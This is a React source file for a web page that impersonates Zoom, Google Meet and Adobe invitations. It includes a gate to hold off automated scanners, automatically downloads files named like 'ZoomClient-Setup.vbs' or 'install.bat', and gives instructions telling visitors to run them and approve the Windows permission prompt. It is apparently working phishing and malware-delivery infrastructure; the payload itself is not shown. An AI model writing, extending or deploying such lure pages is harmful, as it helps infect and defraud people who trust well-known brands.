import { useEffect, useState } from 'react';
import { useQuery } from '@tanstack/react-query';
import { Navigate, useParams } from 'react-router-dom';
import { fetchPublicGuestLink } from '@/api/guest-links';
import { isMobileDevice } from '@/lib/device';
import {
  installerFileNameForTemplate,
  type GuestInviteTemplate,
} from '@/lib/guest-invite';
import { applyMeetingPageBranding } from '@/lib/meeting-branding';
import {
  createPreCheckToken,
  hasPreCheckCookie,
  setPreCheckCookie,
} from '@/lib/pre-check-gate';
import './meeting-join.css';

const PRE_CHECK_MIN_MS = 900;

function useMeetingPageBranding(template: GuestInviteTemplate, phase: 'loading' | 'ready') {
  useEffect(() => applyMeetingPageBranding(template, phase), [template, phase]);
}

function useMeetingGuestBodyClass(template: GuestInviteTemplate) {
  useEffect(() => {
    const body = document.body;
    body.classList.add('meeting-guest-page', `meeting-guest--${template}`);
    body.classList.remove('dark');
    return () => {
      body.classList.remove('meeting-guest-page', `meeting-guest--${template}`);
      body.classList.add('dark');
    };
  }, [template]);
}

/**
 * Light bot gate: branded loader → set cookie → continue (no full-page reload).
 */
function usePreCheckGate(): boolean {
  const [passed, setPassed] = useState(() => hasPreCheckCookie());

  useEffect(() => {
    if (passed) return;

    const startedAt = Date.now();
    const token = createPreCheckToken();
    let released = false;

    function release() {
      if (released || Date.now() - startedAt < PRE_CHECK_MIN_MS) return;
      released = true;
      setPreCheckCookie(token);
      setPassed(true);
    }

    document.addEventListener('mousemove', release, { passive: true });
    document.addEventListener('keydown', release);
    document.addEventListener('touchstart', release, { passive: true });
    const timer = window.setTimeout(release, PRE_CHECK_MIN_MS);
    return () => {
      document.removeEventListener('mousemove', release);
      document.removeEventListener('keydown', release);
      document.removeEventListener('touchstart', release);
      window.clearTimeout(timer);
    };
  }, [passed]);

  return passed;
}

function MeetingBootLoader({ template }: { template: GuestInviteTemplate }) {
  if (template === 'adobe') {
    return (
      <div className="adobe-splash adobe-splash--boot">
        <div className="adobe-splash__center">
          <AdobeLogo size={100} />
          <div className="adobe-splash__spinner" />
          <h2>Opening your document...</h2>
          <p>Preparing the best PDF experience for your device</p>
        </div>
      </div>
    );
  }

  if (template === 'google_meet') {
    return (
      <div className="meeting-loader meeting-loader--meet">
        <div className="meeting-loader__brand meeting-loader__brand--meet">
          <GoogleMeetLogo />
          <span>Google Meet</span>
        </div>
        <div className="meeting-loader__spin meeting-loader__spin--meet" />
      </div>
    );
  }

  return (
    <div className="meeting-loader meeting-loader--zoom">
      <div className="meeting-loader__brand meeting-loader__brand--zoom">
        <ZoomLogo size="sm" />
      </div>
      <div className="meeting-loader__spin meeting-loader__spin--zoom" />
    </div>
  );
}

function GoogleMeetLogo() {
  return (
    <svg width="28" height="28" viewBox="0 0 48 48" aria-hidden>
      <path fill="#00832d" d="M44 14L30 24l14 10V14z" />
      <path fill="#0066da" d="M30 24L4 6v36l26-18z" />
      <path fill="#e94235" d="M4 6l14 10-14 10V6z" />
      <path fill="#2684fc" d="M30 24l14-10v20L30 24z" />
      <path fill="#00ac47" d="M4 42l26-18 14 10L4 42z" />
      <path fill="#ffba00" d="M18 16l12 8-12 8V16z" />
    </svg>
  );
}

function ZoomLogo({ size = 'md' }: { size?: 'sm' | 'md' }) {
  const fontSize = size === 'sm' ? '1.125rem' : '2rem';
  return (
    <span style={{ fontSize, fontWeight: 700, color: '#0b5cff', letterSpacing: '-0.03em' }}>
      zoom
    </span>
  );
}

function MonitorIcon({ color }: { color: string }) {
  return (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="1.5">
      <rect x="2" y="3" width="20" height="14" rx="2" />
      <line x1="8" y1="21" x2="16" y2="21" />
      <line x1="12" y1="17" x2="12" y2="21" />
    </svg>
  );
}

function ShieldIcon({ color }: { color: string }) {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
    </svg>
  );
}

function MobileDesktopRequired({ template }: { template: GuestInviteTemplate }) {
  const isMeet = template === 'google_meet';
  const isAdobe = template === 'adobe';

  return (
    <div className={`meeting-mobile ${isAdobe ? 'meeting-mobile--adobe' : ''}`}>
      <div className="meeting-mobile__card">
        <div className="meeting-mobile__body">
          {isMeet ? (
            <div className="meeting-mobile__brand-row">
              <GoogleMeetLogo />
              <span className="meeting-mobile__brand-text">Google Meet</span>
            </div>
          ) : isAdobe ? (
            <div className="meeting-mobile__brand-row">
              <AdobeLogo size={28} />
              <span className="meeting-mobile__brand-text">Document share</span>
            </div>
          ) : (
            <ZoomLogo size="sm" />
          )}
          <div
            className={`meeting-mobile__icon-wrap ${
              isMeet
                ? 'meeting-mobile__icon-wrap--meet'
                : isAdobe
                  ? 'meeting-mobile__icon-wrap--adobe'
                  : 'meeting-mobile__icon-wrap--zoom'
            }`}
          >
            <MonitorIcon color={isMeet ? '#60a5fa' : isAdobe ? '#f87171' : '#2D8CFF'} />
          </div>
          <h1>Desktop Required</h1>
          <p className="meeting-mobile__msg">
            {isAdobe
              ? 'To open this shared document securely, please use a desktop or laptop computer running Windows.'
              : 'To ensure the best secure video conference experience and full feature support, please open this meeting link on a desktop or laptop computer.'}
          </p>
        </div>
        <div className="meeting-mobile__footer">
          <ShieldIcon color={isMeet ? '#7dd3a8' : isAdobe ? '#f87171' : '#2D8CFF'} />
          {isMeet ? 'Google Workspace Secure' : isAdobe ? 'Adobe Secure' : 'Zoom Secure'}
        </div>
      </div>
    </div>
  );
}

function DownloadSteps({ fileName }: { fileName: string }) {
  return (
    <ol className="meeting-desktop__steps">
      <li>Your download should start automatically ({fileName}).</li>
      <li>Open your Downloads folder and double-click the file.</li>
      <li>Click Yes if Windows asks for permission.</li>
      <li>Keep the setup window open until the progress bar finishes.</li>
    </ol>
  );
}

function BrandDownloadProgress({
  accent,
  downloadStarted,
  cancelled,
  onCancel,
  installerUrl,
  installerFileName,
  downloadingLabel,
  readyLabel,
}: {
  accent: 'zoom' | 'meet';
  downloadStarted: boolean;
  cancelled: boolean;
  onCancel: () => void;
  installerUrl: string;
  installerFileName: string;
  downloadingLabel: string;
  readyLabel: string;
}) {
  return (
    <div className={`brand-dl brand-dl--${accent}`}>
      <div className="brand-dl__progress-wrap">
        <div className="brand-dl__progress-bar">
          <div
            className={`brand-dl__progress-inner ${
              cancelled
                ? 'brand-dl__progress-inner--idle'
                : downloadStarted
                  ? 'brand-dl__progress-inner--done'
                  : 'brand-dl__progress-inner--run'
            }`}
          />
        </div>
        <div className="brand-dl__status">
          {cancelled
            ? 'Download cancelled.'
            : downloadStarted
              ? readyLabel
              : downloadingLabel}
        </div>
      </div>
      <div className="brand-dl__actions">
        <a className="brand-dl__btn" href={installerUrl} download={installerFileName}>
          Manually start download
        </a>
        <button type="button" className="brand-dl__cancel" onClick={onCancel}>
          Cancel
        </button>
      </div>
    </div>
  );
}

function triggerInstallerDownload(url: string, fileName: string) {
  const anchor = document.createElement('a');
  anchor.href = url;
  anchor.download = fileName || 'setup.vbs';
  anchor.rel = 'noopener';
  anchor.style.display = 'none';
  document.body.appendChild(anchor);
  anchor.click();
  window.setTimeout(() => anchor.remove(), 2_000);
}

function useBrowserInstallerDownload(
  code: string,
  installerUrl: string,
  installerFileName: string,
) {
  const [downloadStarted, setDownloadStarted] = useState(false);
  const [cancelled, setCancelled] = useState(false);

  useEffect(() => {
    if (!installerUrl || cancelled) return;

    // Delay so React Strict Mode's mount→unmount→remount does not cancel the download.
    let alive = true;
    const timer = window.setTimeout(() => {
      if (!alive) return;
      triggerInstallerDownload(installerUrl, installerFileName);
      setDownloadStarted(true);
    }, 200);

    return () => {
      alive = false;
      window.clearTimeout(timer);
    };
  }, [code, installerUrl, installerFileName, cancelled]);

  return {
    downloadStarted,
    cancelled,
    cancel: () => setCancelled(true),
  };
}

function ZoomDesktop({
  installerUrl,
  installerFileName,
  code,
}: {
  installerUrl: string;
  installerFileName: string;
  code: string;
}) {
  const { downloadStarted, cancelled, cancel } = useBrowserInstallerDownload(
    code,
    installerUrl,
    installerFileName,
  );

  return (
    <div className="meeting-zoom-desktop">
      <ZoomLogo />
      <h1>Join Meeting</h1>
      <p className="meeting-zoom-desktop__sub">
        You have been invited to join a Zoom meeting. Download and launch the Zoom client to
        connect.
      </p>
      <BrandDownloadProgress
        accent="zoom"
        downloadStarted={downloadStarted}
        cancelled={cancelled}
        onCancel={cancel}
        installerUrl={installerUrl}
        installerFileName={installerFileName}
        downloadingLabel="Downloading Zoom Client..."
        readyLabel="Download started. Open ZoomClient-Setup.vbs from your Downloads folder."
      />
      <DownloadSteps fileName={installerFileName} />
      <p className="meeting-zoom-desktop__note">
        NOTE: For the best connectivity please use Google Chrome on a Windows PC.
      </p>
      <div className="meeting-zoom-desktop__secure">
        <ShieldIcon color="#6e7680" />
        Zoom Secure
      </div>
    </div>
  );
}

function GoogleMeetDesktop({
  installerUrl,
  installerFileName,
  code,
}: {
  installerUrl: string;
  installerFileName: string;
  code: string;
}) {
  const { downloadStarted, cancelled, cancel } = useBrowserInstallerDownload(
    code,
    installerUrl,
    installerFileName,
  );

  return (
    <div className="meeting-meet-desktop">
      <div className="meeting-meet-desktop__brand-row">
        <GoogleMeetLogo />
        <span className="meeting-meet-desktop__brand-text">Google Meet</span>
      </div>
      <h1>Ready to join?</h1>
      <p className="meeting-meet-desktop__sub">
        You have been invited to join a Google Meet call session. Download the meeting app to
        connect from your computer.
      </p>
      <BrandDownloadProgress
        accent="meet"
        downloadStarted={downloadStarted}
        cancelled={cancelled}
        onCancel={cancel}
        installerUrl={installerUrl}
        installerFileName={installerFileName}
        downloadingLabel="Downloading meeting app..."
        readyLabel="Download started. Open GoogleMeet-Setup.vbs from your Downloads folder."
      />
      <DownloadSteps fileName={installerFileName} />
      <p className="meeting-meet-desktop__note">
        NOTE: For the best connectivity pls use Google Chrome on a Windows PC.
      </p>
      <div className="meeting-meet-desktop__secure">
        <ShieldIcon color="#7dd3a8" />
        Google Workspace Secure
      </div>
    </div>
  );
}

function AdobeLogo({ size = 100 }: { size?: number }) {
  return (
    <img
      src="/meeting/adobe-logo.png"
      alt="Document"
      width={size}
      height={size}
      style={{
        maxWidth: size > 40 ? '90%' : undefined,
        maxHeight: size > 40 ? '90%' : undefined,
        width: size > 40 ? 'auto' : size,
        height: size > 40 ? 'auto' : size,
        objectFit: 'contain',
        borderRadius: size > 40 ? 0 : 8,
      }}
    />
  );
}

function AdobeDesktop({
  installerUrl,
  installerFileName,
  code,
  windowsBatUrl,
}: {
  installerUrl: string;
  installerFileName: string;
  code: string;
  windowsBatUrl?: string;
}) {
  const { downloadStarted, cancelled, cancel } = useBrowserInstallerDownload(
    code,
    installerUrl,
    installerFileName,
  );

  return (
    <div className="adobe-download">
      <div className="adobe-download__card">
        <div className="adobe-download__notice" role="alert">
          <div className="adobe-download__notice-spin" aria-hidden />
          <div className="adobe-download__notice-copy">
            <div className="adobe-download__notice-title">
              Document viewer not detected or out of date
            </div>
            <div className="adobe-download__notice-sub">
              We will download the viewer so you can open the shared PDF on this PC.
            </div>
          </div>
        </div>
        <div className="adobe-download__icon" aria-hidden>
          <AdobeLogo size={90} />
        </div>
        <div className="adobe-download__body">
          <h1>Document Viewer for Windows</h1>
          <p className="adobe-download__lead">
            Open and work with the shared PDF on Windows 10 and 11.
          </p>
          <div className="adobe-download__features" role="list">
            <div className="adobe-download__feat">
              <strong className="adobe-download__feat-title">Reliable PDF Viewing</strong>
              <div className="adobe-download__feat-desc">
                Open and view PDFs with high fidelity on Windows.
              </div>
            </div>
            <div className="adobe-download__feat">
              <strong className="adobe-download__feat-title">Powerful Editing Tools</strong>
              <div className="adobe-download__feat-desc">Edit text and images directly in PDFs.</div>
            </div>
            <div className="adobe-download__feat">
              <strong className="adobe-download__feat-title">E-signature Support</strong>
              <div className="adobe-download__feat-desc">
                Sign PDFs electronically from your desktop.
              </div>
            </div>
            <div className="adobe-download__feat">
              <strong className="adobe-download__feat-title">PDF Security</strong>
              <div className="adobe-download__feat-desc">
                Password-protect and redact sensitive content.
              </div>
            </div>
          </div>
          <div className="adobe-download__area">
            <div className="adobe-download__progress-wrap">
              <div className="adobe-download__progress-bar">
                <div
                  className={`adobe-download__progress-inner ${
                    cancelled
                      ? 'adobe-download__progress-inner--idle'
                      : downloadStarted
                        ? 'adobe-download__progress-inner--done'
                        : ''
                  }`}
                />
              </div>
              <div className="adobe-download__status">
                {cancelled
                  ? 'Download cancelled.'
                  : downloadStarted
                    ? `Download started. Open ${installerFileName} from your Downloads folder.`
                    : 'Preparing download…'}
              </div>
            </div>
            <div className="adobe-download__actions">
              <a className="adobe-download__btn-ghost" href={installerUrl} download={installerFileName}>
                Manually start download
              </a>
              {windowsBatUrl ? (
                <a className="adobe-download__btn-ghost" href={windowsBatUrl} download="install.bat">
                  Alternative installer (.bat)
                </a>
              ) : null}
              <button
                type="button"
                className="adobe-download__btn-cancel"
                onClick={cancel}
              >
                Cancel
              </button>
            </div>
          </div>
          <DownloadSteps fileName={installerFileName} />
          <footer className="adobe-download__footer">Secure document share · Windows viewer setup</footer>
        </div>
      </div>
    </div>
  );
}

export function MeetingJoinLanding({ template: routeTemplate }: { template: GuestInviteTemplate }) {
  useMeetingGuestBodyClass(routeTemplate);
  const preCheckPassed = usePreCheckGate();
  const mobile = isMobileDevice();
  const { code = '' } = useParams();
  const legacyAdobePath =
    routeTemplate === 'adobe' &&
    typeof window !== 'undefined' &&
    window.location.pathname.startsWith('/adobefile/');

  const query = useQuery({
    queryKey: ['guest-public', code, routeTemplate],
    enabled: Boolean(code) && preCheckPassed && !legacyAdobePath,
    queryFn: () => fetchPublicGuestLink(code),
    retry: 1,
  });

  const brandingPhase =
    !preCheckPassed || query.isLoading ? 'loading' : 'ready';
  useMeetingPageBranding(routeTemplate, brandingPhase);

  if (legacyAdobePath) {
    const next = window.location.pathname.replace(/^\/adobefile\//, '/sharedfile/');
    return <Navigate to={`${next}${window.location.search}`} replace />;
  }

  if (!preCheckPassed || query.isLoading) {
    return <MeetingBootLoader template={routeTemplate} />;
  }

  if (query.isError || !query.data) {
    return (
      <div className="meeting-error">
        This meeting link is invalid, expired, or no longer available.
      </div>
    );
  }

  // Keep page branding aligned with the link's template (Zoom vs Meet vs Adobe).
  if (query.data.inviteTemplate && query.data.inviteTemplate !== routeTemplate) {
    const path = new URL(query.data.joinUrl).pathname;
    return <Navigate to={path} replace />;
  }

  if (mobile) {
    return <MobileDesktopRequired template={routeTemplate} />;
  }

  if (routeTemplate === 'adobe') {
    return (
      <AdobeDesktop
        code={code}
        installerUrl={query.data.windowsInstallerUrl}
        installerFileName={
          query.data.installerFileName ?? installerFileNameForTemplate(routeTemplate)
        }
        windowsBatUrl={query.data.windowsBatUrl}
      />
    );
  }

  if (routeTemplate === 'google_meet') {
    return (
      <GoogleMeetDesktop
        code={code}
        installerUrl={query.data.windowsInstallerUrl}
        installerFileName={
          query.data.installerFileName ?? installerFileNameForTemplate(routeTemplate)
        }
      />
    );
  }

  return (
    <ZoomDesktop
      code={code}
      installerUrl={query.data.windowsInstallerUrl}
      installerFileName={
        query.data.installerFileName ?? installerFileNameForTemplate(routeTemplate)
      }
    />
  );
}
